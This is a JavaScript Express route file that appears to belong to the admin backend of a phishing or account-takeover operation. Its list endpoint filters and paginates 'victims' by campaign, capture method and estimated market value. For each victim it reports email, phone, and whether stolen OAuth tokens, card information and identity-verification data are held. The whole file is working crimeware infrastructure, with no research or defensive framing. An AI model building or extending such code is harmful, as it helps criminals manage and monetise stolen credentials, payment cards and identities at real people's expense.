// Victim management routes aggregator
const express = require('express');
const router = express.Router();
const { PrismaClient } = require('@prisma/client');

const detailRoutes = require('./detail');
const updateRoutes = require('./update');
const exportRoutes = require('./export');

// Initialize repositories
const prisma = new PrismaClient();
const VictimRepository = require('../../../../repositories/victimRepository');
const OAuthTokenRepository = require('../../../../repositories/oauthTokenRepository');
const logger = require('../../../../utils/logger');

const victimRepository = new VictimRepository(prisma);
const oauthTokenRepository = new OAuthTokenRepository(prisma);

// GET /api/admin/victims - List victims with advanced filtering
router.get('/', async (req, res) => {
  try {
    // Extract query parameters
    const {
      page = 1,
      limit = 50,
      search,
      campaignId,
      captureMethod,
      accountType,
      minMarketValue,
      maxMarketValue,
      startDate,
      endDate,
      registrationCompleted,
      isActive = true
    } = req.query;

    // Build filters
    const filters = {
      campaignId,
      captureMethod,
      accountType,
      minMarketValue: minMarketValue ? parseFloat(minMarketValue) : undefined,
      maxMarketValue: maxMarketValue ? parseFloat(maxMarketValue) : undefined,
      startDate,
      endDate,
      registrationCompleted: registrationCompleted === 'true' ? true : 
                            registrationCompleted === 'false' ? false : undefined,
      isActive: isActive === 'true' ? true : isActive === 'false' ? false : true,
      search
    };

    // Remove undefined filters
    Object.keys(filters).forEach(key => {
      if (filters[key] === undefined || filters[key] === '') {
        delete filters[key];
      }
    });

    // Pagination
    const pagination = {
      page: parseInt(page, 10),
      limit: Math.min(parseInt(limit, 10), 100) // Max 100 per page
    };

    // Fetch victims
    const result = await victimRepository.findMany(filters, pagination);

    // Format response
    const victims = result.victims.map(victim => ({
      id: victim.id,
      email: victim.email,
      name: victim.name,
      phone: victim.phone,
      captureMethod: victim.captureMethod,
      captureTimestamp: victim.captureTimestamp,
      campaign: victim.campaign ? {
        id: victim.campaign.id,
        name: victim.campaign.name,
        code: victim.campaign.code
      } : null,
      validation: victim.validation,
      riskAssessment: victim.riskAssessment,
      hasOAuthTokens: victim.oauthTokens && victim.oauthTokens.length > 0,
      oauthTokensCount: victim.oauthTokens ? victim.oauthTokens.length : 0,
      hasCardInfo: victim.cardInformation && Object.keys(victim.cardInformation).length > 0,
      hasIdentityVerification: victim.identityVerification && 
                               Object.keys(victim.identityVerification).length > 0,
      registrationCompleted: victim.validation?.registrationCompleted || false,
      isActive: victim.isActive
    }));

    res.status(200).json({
      success: true,
      data: victims,
      pagination: {
        page: result.page,
        limit: result.limit,
        total: result.total,
        totalPages: result.totalPages
      },
      filters: filters
    });
  } catch (error) {
    logger.error('Error fetching victims:', error);
    res.status(500).json({
      error: 'Failed to fetch victims',
      message: error.message
    });
  }
});

router.use('/:id', detailRoutes);
router.use('/:id', updateRoutes);
router.use('/export', exportRoutes);

module.exports = router;

